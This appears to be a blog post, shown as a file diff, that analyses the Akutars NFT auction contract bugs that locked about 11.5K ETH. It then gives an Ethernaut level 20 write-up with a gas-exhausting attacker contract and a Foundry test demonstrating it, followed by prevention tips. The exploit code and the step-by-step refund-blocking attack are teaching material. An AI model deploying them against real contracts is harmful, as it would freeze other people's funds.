@@ -1,0 +1,732 @@
+---
+title: DDoS attack
+date: '2023-05-10T00:00:00Z'
+modifiedTime: '2023-05-10T00:00:00Z'
+summary: Akutar NFT incidand an example of DDoS attack from Ethernaut.
+image: 'blogs/blockchain/dos/cover.webp'
+type: BlogPost
+---
+
+# The Akutars project and 11.5K ETH "burn"
+
+[Akutars](https://www.aku.world) or AkuDreams was an NFT project launched in April 2022. The original Akutars' smart contracts are at:
+
+- [AkuAuction (auction contract)](https://etherscan.io/address/0xf42c318dbfbaab0eee040279c6a2588fa01a961d#code)
+- [Akutar (NFT contract)](https://etherscan.io/address/0xaad35c2dadbe77f97301617d82e661776c891fa9#code)
+
+```solidity
+pragma solidity ^0.8.13;
+
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/utils/Strings.sol";
+
+interface akuNFT {
+  function airdropProgress() external view returns (uint256);
+}
+
+contract AkuAuction is Ownable {
+  using Strings for uint256;
+
+  address payable immutable project;
+
+  uint256 public maxNFTs = 15000;
+  uint256 public totalForAuction = 5495; //529 + 2527 + 6449
+
+  struct bids {
+    address bidder;
+    uint80 price;
+    uint8 bidsPlaced;
+    uint8 finalProcess; //0: Not processed, 1: refunded, 2: withdrawn
+  }
+
+  uint256 private constant DURATION = 126 minutes;
+  uint256 public immutable startingPrice;
+  uint256 public immutable startAt;
+  uint256 public expiresAt;
+  uint256 public immutable discountRate;
+  mapping(address => uint256) public mintPassOwner;
+  uint256 public constant mintPassDiscount = 0.5 ether;
+  mapping(address => uint256) public personalBids;
+  mapping(uint256 => bids) public allBids;
+  uint256 public bidIndex = 1;
+  uint256 public totalBids;
+  uint256 public totalBidValue;
+  uint256 public maxBids = 3;
+  uint256 public refundProgress = 1;
+
+  akuNFT public akuNFTs;
+
+  constructor(
+    address _project,
+    uint256 startingTime,
+    uint256 _startingPrice,
+    uint256 _discountRate
+  ) {
+    project = payable(_project);
+
+    startingPrice = _startingPrice;
+    startAt = startingTime;
+    expiresAt = startAt + DURATION;
+    discountRate = _discountRate;
+
+    require(_startingPrice >= _discountRate * (DURATION / 6 minutes), "Starting price less than minimum");
+  }
+
+  function getPrice() public view returns (uint80) {
+    uint256 currentTime = block.timestamp;
+    if (currentTime > expiresAt) currentTime = expiresAt;
+    uint256 timeElapsed = (currentTime - startAt) / 6 minutes;
+    uint256 discount = discountRate * timeElapsed;
+    return uint80(startingPrice - discount);
+  }
+
+  function bid(uint8 amount) external payable {
+    _bid(amount, msg.value);
+  }
+
+  receive() external payable {
+    revert("Please use the bid function");
+  }
+
+  function _bid(uint8 amount, uint256 value) internal {
+    require(block.timestamp > startAt, "Auction not started yet");
+    require(block.timestamp < expiresAt, "Auction expired");
+    uint80 price = getPrice();
+    uint256 totalPrice = price * amount;
+    if (value < totalPrice) {
+      revert("Bid not high enough");
+    }
+
+    uint256 myBidIndex = personalBids[msg.sender];
+    bids memory myBids;
+    uint256 refund;
+
+    if (myBidIndex > 0) {
+      myBids = allBids[myBidIndex];
+      refund = myBids.bidsPlaced * (myBids.price - price);
+    }
+    uint256 _totalBids = totalBids + amount;
+    myBids.bidsPlaced += amount;
+
+    if (myBids.bidsPlaced > maxBids) {
+      revert("Bidding limits exceeded");
+    }
+
+    if (_totalBids > totalForAuction) {
+      revert("Auction Full");
+    } else if (_totalBids == totalForAuction) {
+      expiresAt = block.timestamp; //Auction filled
+    }
+
+    myBids.price = price;
+
+    if (myBidIndex > 0) {
+      allBids[myBidIndex] = myBids;
+    } else {
+      myBids.bidder = msg.sender;
+      personalBids[msg.sender] = bidIndex;
+      allBids[bidIndex] = myBids;
+      bidIndex++;
+    }
+
+    totalBids = _totalBids;
+    totalBidValue += totalPrice;
+
+    refund += value - totalPrice;
+    if (refund > 0) {
+      (bool sent, ) = msg.sender.call{ value: refund }("");
+      require(sent, "Failed to refund bidder");
+    }
+  }
+
+  function loadMintPassOwners(address[] calldata owners, uint256[] calldata amounts) external onlyOwner {
+    for (uint256 i = 0; i < owners.length; i++) {
+      mintPassOwner[owners[i]] = amounts[i];
+    }
+  }
+
+  function myBidCount(address user) public view returns (uint256) {
+    return allBids[personalBids[user]].bidsPlaced;
+  }
+
+  function myBidData(address user) external view returns (bids memory) {
+    return allBids[personalBids[user]];
+  }
+
+  function setNFTContract(address _contract) external onlyOwner {
+    akuNFTs = akuNFT(_contract);
+  }
+
+  function emergencyWithdraw() external {
+    require(block.timestamp > expiresAt + 3 days, "Please wait for airdrop period.");
+
+    bids memory bidData = allBids[personalBids[msg.sender]];
+    require(bidData.bidsPlaced > 0, "No bids placed");
+    require(bidData.finalProcess == 0, "Refund already processed");
+
+    allBids[personalBids[msg.sender]].finalProcess = 2;
+    (bool sent, ) = bidData.bidder.call{ value: bidData.price * bidData.bidsPlaced }("");
+    require(sent, "Failed to refund bidder");
+  }
+
+  function processRefunds() external {
+    require(block.timestamp > expiresAt, "Auction still in progress");
+    uint256 _refundProgress = refundProgress;
+    uint256 _bidIndex = bidIndex;
+    require(_refundProgress < _bidIndex, "Refunds already processed");
+
+    uint256 gasUsed;
+    uint256 gasLeft = gasleft();
+    uint256 price = getPrice();
+
+    for (uint256 i = _refundProgress; gasUsed < 5000000 && i < _bidIndex; i++) {
+      bids memory bidData = allBids[i];
+      if (bidData.finalProcess == 0) {
+        uint256 refund = (bidData.price - price) * bidData.bidsPlaced;
+        uint256 passes = mintPassOwner[bidData.bidder];
+        if (passes > 0) {
+          refund += mintPassDiscount * (bidData.bidsPlaced < passes ? bidData.bidsPlaced : passes);
+        }
+        allBids[i].finalProcess = 1;
+        if (refund > 0) {
+          (bool sent, ) = bidData.bidder.call{ value: refund }("");
+          require(sent, "Failed to refund bidder");
+        }
+      }
+
+      gasUsed += gasLeft - gasleft();
+      gasLeft = gasleft();
+      _refundProgress++;
+    }
+
+    refundProgress = _refundProgress;
+  }
+
+  function claimProjectFunds() external onlyOwner {
+    require(block.timestamp > expiresAt, "Auction still in progress");
+    require(refundProgress >= totalBids, "Refunds not yet processed");
+    require(akuNFTs.airdropProgress() >= totalBids, "Airdrop not complete");
+
+    (bool sent, ) = project.call{ value: address(this).balance }("");
+    require(sent, "Failed to withdraw");
+  }
+
+  function getAuctionDetails(address user)
+    external
+    view
+    returns (
+      uint256 remainingNFTs,
+      uint256 expires,
+      uint256 currentPrice,
+      uint256 userBids
+    )
+  {
+    remainingNFTs = totalForAuction - totalBids;
+    expires = expiresAt;
+    currentPrice = getPrice();
+    if (user != address(0)) userBids = allBids[personalBids[user]].bidsPlaced;
+  }
+}
+```
+
+<Annotation caption="Akutar Auction contract" />
+
+```solidity
+//SPDX-License-Identifier: MIT
+pragma solidity 0.8.13;
+
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
+import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Burnable.sol";
+import "@openzeppelin/contracts/utils/Strings.sol";
+
+/*
+Akutar.sol
+
+Written by: mousedev.eth
+Contributions by: manifold.xyz
+Public Repository: https://github.com/mouse-dev-1/Akutar
+
+15,000 NFTs in 4 sections
+
+(6) ID 1-6 partner reserved NFTs
+
+(529) ID 7-535 Mega OG Akutars, randomly assigned to 529 Mega OG Mint Pass holders (addresses known)
+
+(2527) ID 536-3,062 OG Akutars, randomly assigned to 2,527 OG Mint Pass holders (addresses known)
+
+(11938) ID 3,063-15,000 Akutars, randomly assigned to 6,443 Mint Pass holders + 5495 public bids (addresses known)
+
+*/
+
+contract Akutar is Ownable, ERC721, ERC721Burnable {
+    //Contract URI
+    string public CONTRACT_URI;
+
+    //Base URI
+    string public BASE_URI;
+
+    //Shift Quantity;
+    uint256 public shiftQuantity;
+
+    //Block to base randomness off of
+    uint256 blockToUse;
+
+    uint256 _totalSupply;
+
+    //Provenance hash
+    string public PROVENANCE_HASH;
+
+    //Struct to define a grouping of airdrops
+    struct Grouping {
+        uint256 startingIndex;
+        uint256 endingIndex;
+        uint256 minted;
+    }
+
+    //Mapping of groupingId to grouping struct.
+    mapping(uint256 => Grouping) public airdropGroupings;
+
+    // EIP2981
+    uint256 private _royaltyBps;
+    address payable private _royaltyRecipient;
+    bytes4 private constant _INTERFACE_ID_ROYALTIES_EIP2981 = 0x2a55205a;
+
+    constructor() ERC721("Akutars", "AKU") {
+        //Partner
+        airdropGroupings[0] = Grouping(1, 7, 0);
+
+        //Mega OG
+        airdropGroupings[1] = Grouping(7, 536, 0);
+
+        //OG
+        airdropGroupings[2] = Grouping(536, 3063, 0);
+
+        //Normal
+        airdropGroupings[3] = Grouping(3063, 15001, 0);
+    }
+
+    /**
+     * @dev See {IERC165-supportsInterface}.
+     */
+    function supportsInterface(bytes4 interfaceId)
+        public
+        view
+        virtual
+        override(ERC721)
+        returns (bool)
+    {
+        return super.supportsInterface(interfaceId) || interfaceId == _INTERFACE_ID_ROYALTIES_EIP2981;
+    }
+
+    function airdrop(uint256 airdropGrouping, address[] memory addresses)
+        public
+        onlyOwner
+    {
+        require(shiftQuantity > 0, "Not yet shifted!");
+
+        Grouping memory thisGrouping = airdropGroupings[airdropGrouping];
+
+        //Total tokens in this grouping.
+        uint256 maxQuantityWithinThisGrouping = (thisGrouping.endingIndex -
+            thisGrouping.startingIndex);
+
+        //How much to shift within these constraints.
+        uint256 shiftQuantityWithinThisGrouping = shiftQuantity %
+            maxQuantityWithinThisGrouping;
+
+        //Index to currently start on.
+        uint256 startingIndexWithinThisGrouping = thisGrouping.startingIndex +
+            thisGrouping.minted +
+            shiftQuantityWithinThisGrouping;
+
+        require(
+            thisGrouping.minted + addresses.length <=
+                maxQuantityWithinThisGrouping,
+            "Would overflow grouping"
+        );
+
+        //Cast to thisId
+        uint256 currentId = startingIndexWithinThisGrouping;
+
+        for (uint256 i = 0; i < addresses.length; i++) {
+            //If we are over the endingIndex because of the shuffle, adjust to current position minus max quantity;
+            if (currentId >= thisGrouping.endingIndex)
+                currentId = currentId - maxQuantityWithinThisGrouping;
+
+            //Mint thisId
+            _mint(addresses[i], currentId);
+
+            //Increment ID by one.
+            currentId++;
+        }
+
+        _totalSupply += addresses.length;
+        airdropGroupings[airdropGrouping].minted += addresses.length;
+    }
+
+    function commit(string memory _provenanceHash) external onlyOwner {
+        //Require shift hasn't happened
+        require(blockToUse == 0, "Already committed!");
+
+        //Set the block to use as 5 blocks from now
+        blockToUse = block.number + 5;
+
+        //Set the provenance hash
+        PROVENANCE_HASH = _provenanceHash;
+    }
+
+    function reveal() external onlyOwner {
+        //Require they have committed
+        require(blockToUse != 0, "You have yet to commit");
+
+        //Require shift hasn't happened
+        require(shiftQuantity == 0, "Already shifted!");
+
+        //Require it is at or beyond blockToUse
+        require(
+            block.number >= blockToUse,
+            "Not enough time has passed to reveal"
+        );
+
+        //set shift quantity
+        shiftQuantity = uint256(blockhash(blockToUse));
+    }
+
+
+    function setBaseURI(string memory _baseURI) public onlyOwner {
+        BASE_URI = _baseURI;
+    }
+
+    function setContractURI(string memory _contractURI) public onlyOwner {
+        CONTRACT_URI = _contractURI;
+    }
+
+    function contractURI() public view returns (string memory) {
+        return CONTRACT_URI;
+    }
+
+    function totalSupply() public view returns (uint256) {
+        return _totalSupply;
+    }
+
+    function tokenURI(uint256 _tokenId)
+        public
+        view
+        override
+        returns (string memory)
+    {
+        require(_exists(_tokenId), "Token does not exist.");
+
+        return
+            string(
+                abi.encodePacked(BASE_URI, Strings.toString(_tokenId), ".json")
+            );
+    }
+
+    /**
+     * ROYALTY FUNCTIONS
+     */
+    function updateRoyalties(address payable recipient, uint256 bps) external onlyOwner {
+        _royaltyRecipient = recipient;
+        _royaltyBps = bps;
+    }
+
+    function royaltyInfo(uint256, uint256 value) external view returns (address, uint256) {
+        return (_royaltyRecipient, value*_royaltyBps/10000);
+    }
+}
+```
+
+<Annotation caption="Akutar token (NFT) contract" />
+
+In the auction contract, there was a software bug that make `claimProjectFunds()` to be stuck forever.
+On top of that, there also an error that could stop `processRefunds()` (hence Denial of Service or DoS).
+
+## Bug 01 - processRefunds
+
+Let's look at the `_bid()` and `processRefunds()` function below, the authors original intent is clearly to match:
+
+- `totalBids` => number of NFTs bidded during the auction.
+- `bidIndex` => index of bidder (0-indexed) for the auction.
+- `refundProgress` => number of **people (tracked by bidIndex)** have refunded so far
+
+```solidity
+function _bid(uint8 amount, uint256 value) internal {
+  require(block.timestamp > startAt, "Auction not started yet");
+  require(block.timestamp < expiresAt, "Auction expired");
+  uint80 price = getPrice();
+  uint256 totalPrice = price * amount;
+  if (value < totalPrice) {
+    revert("Bid not high enough");
+  }
+
+  uint256 myBidIndex = personalBids[msg.sender];
+  bids memory myBids;
+  uint256 refund;
+
+  if (myBidIndex > 0) {
+    myBids = allBids[myBidIndex];
+    refund = myBids.bidsPlaced * (myBids.price - price);
+  }
+  uint256 _totalBids = totalBids + amount;
+  myBids.bidsPlaced += amount;
+
+  if (myBids.bidsPlaced > maxBids) {
+    revert("Bidding limits exceeded");
+  }
+
+  if (_totalBids > totalForAuction) {
+    revert("Auction Full");
+  } else if (_totalBids == totalForAuction) {
+    expiresAt = block.timestamp; //Auction filled
+  }
+
+  myBids.price = price;
+
+  if (myBidIndex > 0) {
+    allBids[myBidIndex] = myBids;
+  } else {
+    myBids.bidder = msg.sender;
+    personalBids[msg.sender] = bidIndex;
+    allBids[bidIndex] = myBids;
+    bidIndex++;
+  }
+
+  totalBids = _totalBids;
+  totalBidValue += totalPrice;
+
+  refund += value - totalPrice;
+  if (refund > 0) {
+    (bool sent, ) = msg.sender.call{ value: refund }("");
+    require(sent, "Failed to refund bidder");
+  }
+}
+```
+
+<Annotation caption="bid function [line 75]" />
+
+```solidity
+function processRefunds() external {
+  require(block.timestamp > expiresAt, "Auction still in progress");
+  uint256 _refundProgress = refundProgress;
+  uint256 _bidIndex = bidIndex;
+  require(_refundProgress < _bidIndex, "Refunds already processed");
+
+  uint256 gasUsed;
+  uint256 gasLeft = gasleft();
+  uint256 price = getPrice();
+
+  for (uint256 i = _refundProgress; gasUsed < 5000000 && i < _bidIndex; i++) {
+    bids memory bidData = allBids[i];
+    if (bidData.finalProcess == 0) {
+      uint256 refund = (bidData.price - price) * bidData.bidsPlaced;
+      uint256 passes = mintPassOwner[bidData.bidder];
+      if (passes > 0) {
+        refund += mintPassDiscount * (bidData.bidsPlaced < passes ? bidData.bidsPlaced : passes);
+      }
+      allBids[i].finalProcess = 1;
+      if (refund > 0) {
+        (bool sent, ) = bidData.bidder.call{ value: refund }("");
+        require(sent, "Failed to refund bidder");
+      }
+    }
+
+    gasUsed += gasLeft - gasleft();
+    gasLeft = gasleft();
+    _refundProgress++;
+  }
+
+  refundProgress = _refundProgress;
+}
+```
+
+<Annotation caption="processRefunds function [line 156]" />
+
+On **_line 22_** of `processRefunds()`, a require statement is used. This could revert the whole transaction whenever _a single refund failed_.
+A Denial of Service attack that forever stop `processFunds()` could be conduct in the following manner:
+
+1. A smart contract, i.e. `AttackerContract`, participate in auction and mint some NFTs (permissible from given source code) at a suitable index.
+2. The contract implements a `receive()` function that always revert => `processRefunds()` will revert at `AttackerContract`'s bidding index.
+3. Other bidder won't be able to get their refunds as `processRefunds()` always revert and `refundProgress` will be stuck forever.
+
+## Bug 02: claimProjectFunds
+
+This is a much more naive mistake by AkuDream's team. In `claimProjectFunds()` **_line 3-4_**, `refundProgress` should keep track of `bidIndex` instead of `totalBids`.
+Therefore, this function will never work as the project sold out, and `refundProgress` is always smaller than `totalBids`.
+As a consequence, 11,539.5 ETH is stuck forever in the [AkuAuction contract](https://etherscan.io/address/0xf42c318dbfbaab0eee040279c6a2588fa01a961d#code)
+
+```solidity
+function claimProjectFunds() external onlyOwner {
+  require(block.timestamp > expiresAt, "Auction still in progress");
+  require(refundProgress >= totalBids, "Refunds not yet processed");
+  require(akuNFTs.airdropProgress() >= totalBids, "Airdrop not complete");
+
+  (bool sent, ) = project.call{ value: address(this).balance }("");
+  require(sent, "Failed to withdraw");
+}
+```
+
+# Ethernaut Level 20 - DoS attack
+
+[This level](https://ethernaut.openzeppelin.com/level/20) of Ethernaut introduce Denial of Service attack.
+Pass this level by denying the `Denial` contract owner from withdrawing funds (whilst the contract still has funds, and the transaction is of 1M gas or less).
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+contract Denial {
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address public constant owner = address(0xA9E);
+    uint timeLastWithdrawn;
+    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
+
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
+
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint amountToSend = address(this).balance / 100;
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value:amountToSend}("");
+        payable(owner).transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] +=  amountToSend;
+    }
+
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+```
+
+## Strategy analysis
+
+A few keynotes from the `Denial` contract:
+
+- `setWithdrawPartner` is public
+- withdraw partner is not limited to EOA (can be a smart contract).
+
+In order to stop owner from withdrawing funds, one of the following must happen:
+
+1. the call to `withdraw()` is reverted.
+2. fund is exhausted before owner receive their share (line 20) => impractical since withdraw 1% balance each time.
+
+For the 1st case, withdrawal partner receive their share by a low-level `call` statement on **_line 19_**.
+Therefore making this call failed, i.e. a simple `revert()` or `assert(false)` statement, won't do the trick.
+Instead, the partner contract need to:
+
+- execute `while(true) { <some_statement>; }` to consume all gas => OutOfGas reversal error.
+- OR perform re-entrancy on `withdraw()` => exhaust the call stack by consuming all gas => same OutOfGas error.
+
+## Implementation
+
+Create an attacker contract as follow:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+import "./Denial.sol";
+
+contract DenialAttack {
+  uint256 i;
+  Denial DenialContract;
+
+  constructor(address payable denialAddr) {
+    DenialContract = Denial(denialAddr);
+  }
+
+  function attack() public {
+    DenialContract.setWithdrawPartner(address(this));
+  }
+
+  receive() external payable {
+    while (true) {
+      i += 1;
+    }
+  }
+}
+```
+
+Then a flow of this attack is:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "~/DoS/Denial.sol";
+import "~/DoS/DenialAttack.sol";
+
+contract DenialTest is Test {
+  address owner = vm.addr(1);
+  address hacker = vm.addr(2);
+
+  function setUp() public {}
+
+  function testReentranceAttack() public {
+    uint256 initialGas = gasleft();
+    vm.startPrank(owner);
+    Denial DenialContract = new Denial();
+    address payable denialAddr = payable(address(DenialContract));
+    vm.deal(denialAddr, 100 ether); // Deal 100 ether to the Denial contract.
+    DenialContract.setWithdrawPartner(hacker);
+
+    // verify that withdraw is successful.
+    DenialContract.withdraw();
+    assertEq(owner.balance, 1 ether, "owner balance should be 1 ETH");
+    assertEq(hacker.balance, 1 ether, "hacker (current partner) balance should be 1 ETH");
+    vm.stopPrank();
+
+    // Hacker exploit the smart contract.
+    vm.startPrank(hacker);
+    DenialAttack exploiterContract = new DenialAttack(denialAddr);
+    exploiterContract.attack();
+    assertEq(DenialContract.partner(), address(exploiterContract)); // confirm withdraw partner
+    vm.stopPrank();
+
+    // Simulate a hypothetical "infinite" gas limit, transaction revert "OutOfGas".
+    uint256 INFINITE_GAS = 30_000_000;
+    vm.expectRevert("Out of Gas");
+    vm.prank(owner);
+    (bool result, ) = denialAddr.call{ gas: INFINITE_GAS }(abi.encodeWithSignature("withdraw()"));
+    uint256 gasUsed = initialGas - gasleft();
+    assert(!result && gasUsed > INFINITE_GAS);
+  }
+}
+```
+
+## Preventation
+
+For the specific example from Ethernaut lvl 20, we can:
+
+1. Guard from re-entrancy, [see](https://philho.xyz/blog/smart_contract/reentrance_attack)
+2. Restrict `setWithdrawPartner` to:
+
+- contract owner (then choose trusted partner) OR
+- EOA only, e.g. [consensys note](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/)
+
+# Conclusion
+
+In conclusion, DDoS attacks pose a significant threat to smart contracts.
+Protecting against DDoS attacks involves implementing measures specific to each contract's requirements.
+
+It's important to note that DDoS vulnerabilities often stem from flawed logic within the contract itself.
+Therefore, it's best to use fool-proof functions and have a good understand of EVM calls.
+
+# References
+
+1. [How Akutar NFT loses 34M USD](https://blocksecteam.medium.com/how-akutar-nft-loses-34m-usd-60d6cb053dff)
+2. [AkuAuction (auction contract)](https://etherscan.io/address/0xf42c318dbfbaab0eee040279c6a2588fa01a961d#code)
+3. [Akutar (NFT contract)](https://etherscan.io/address/0xaad35c2dadbe77f97301617d82e661776c891fa9#code)
+4. [Ethernaut level 20](https://ethernaut.openzeppelin.com/level/20)
+5. [Level 20 is no lonnger solvable by assert(false)](https://ethereum.stackexchange.com/a/113362)
+6. [Foundry cheatcodes reference](https://book.getfoundry.sh/cheatcodes/)
